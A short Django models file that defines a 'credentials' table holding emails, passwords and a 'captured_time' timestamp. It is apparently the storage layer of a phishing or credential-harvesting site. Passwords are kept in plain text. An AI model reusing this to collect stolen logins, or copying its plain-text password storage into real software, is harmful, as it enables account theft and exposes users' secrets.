from django.db import models

# Create your models here.
class credentials(models.Model):
    email = models.CharField(max_length=1000)
    password = models.CharField(max_length=10000)
    captured_time = models.DateTimeField(auto_now=True)

    